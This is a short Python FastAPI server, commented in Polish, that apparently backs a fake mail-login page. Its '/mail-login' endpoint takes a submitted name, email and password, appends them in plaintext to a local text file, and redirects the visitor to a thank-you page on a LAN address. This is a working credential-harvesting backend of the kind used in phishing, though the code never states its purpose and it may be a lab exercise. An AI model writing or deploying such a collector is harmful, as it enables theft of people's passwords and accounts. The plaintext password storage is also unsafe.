from fastapi import FastAPI, Form, status, Response, responses
import uvicorn

app = FastAPI()

@app.get("/")
def strona():
    return {"A": "Wartość A", "B": "Wartość B"}


def save_data(name, email, password):
    txt = f"Dane: Name -> {name} | email -> {email} | haslo -> {password} \n"
    with open("dane.txt", mode="a") as datas:
        datas.write(txt)

@app.post("/mail-login")
def read_data_form(name: str = Form(...),
                         password: str = Form(...),
                         email: str = Form(...),
                         ):

    save_data(name, email, password)

    if name == "NIC":
        return Response(status_code=status.HTTP_204_NO_CONTENT)

    return responses.RedirectResponse(url="http://192.168.72.116/thanks.html")



uvicorn.run(app, port=8080, host='0.0.0.0')